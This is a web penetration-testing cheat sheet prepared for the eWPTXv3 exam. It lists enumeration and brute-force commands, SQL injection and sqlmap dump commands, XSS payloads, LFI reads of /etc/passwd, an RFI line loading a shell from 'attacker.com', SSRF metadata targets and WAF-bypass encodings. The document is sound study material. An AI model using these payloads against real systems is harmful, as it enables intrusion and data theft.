# eWPTXv3 Cheat Sheet

## Overview
Quick reference cheat sheet for eWPTXv3 exam.

**Source**: [dev-angelist GitBook](https://dev-angelist.gitbook.io/ewptxv3-notes/ewptx-cheat-sheet)

## Reconnaissance

### DNS Enumeration
```bash
dig axfr @<ns> <domain>
host -l <domain> <ns>
sublist3r -d <domain>
amass enum -d <domain>
```

### Subdomain Enumeration
```bash
subfinder -d <domain>
crt.sh - Certificate search
```

## Authentication

### Basic Auth Brute Force
```bash
hydra -l <user> -P <wordlist> <target> http-get /protected
```

### Session Testing
- Cookie manipulation
- Session fixation
- JWT manipulation

## SQL Injection

### Basic Payloads
```sql
' OR '1'='1
' UNION SELECT NULL--
' OR 1=1--
```

### SQLMap
```bash
sqlmap -u <url> -p <param>
sqlmap -r <request_file>
sqlmap -u <url> --dbs
sqlmap -u <url> -D <db> --tables
sqlmap -u <url> -D <db> -T <table> --dump
```

## XSS

### Basic Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
```

## File Inclusion

### LFI
```bash
../../../etc/passwd
php://filter/read=convert.base64-encode/resource=index.php
```

### RFI
```bash
http://attacker.com/shell.php
```

## SSRF

### Basic Payloads
```bash
http://127.0.0.1/
http://localhost/
http://169.254.169.254/
```

## WAF Bypass

### Encoding
- URL encoding: `%27`
- Double encoding: `%2527`
- Unicode: `%u0027`

### Case Variation
- `SELECT` → `SeLeCt`
- `UNION` → `UnIoN`

## API Testing

### Common Endpoints
- `/api/v1/`
- `/rest/`
- `/graphql`

### Testing
- Parameter manipulation
- Authentication bypass
- Rate limiting bypass

## Tools Quick Reference

### Burp Suite
- Proxy: Intercept requests
- Repeater: Manual testing
- Intruder: Fuzzing
- Scanner: Automated scanning

### OWASP ZAP
- Automated scanning
- Manual testing
- API testing

### SQLMap
- Automated SQL injection
- Database enumeration
- Data extraction

## Last Updated
December 2023

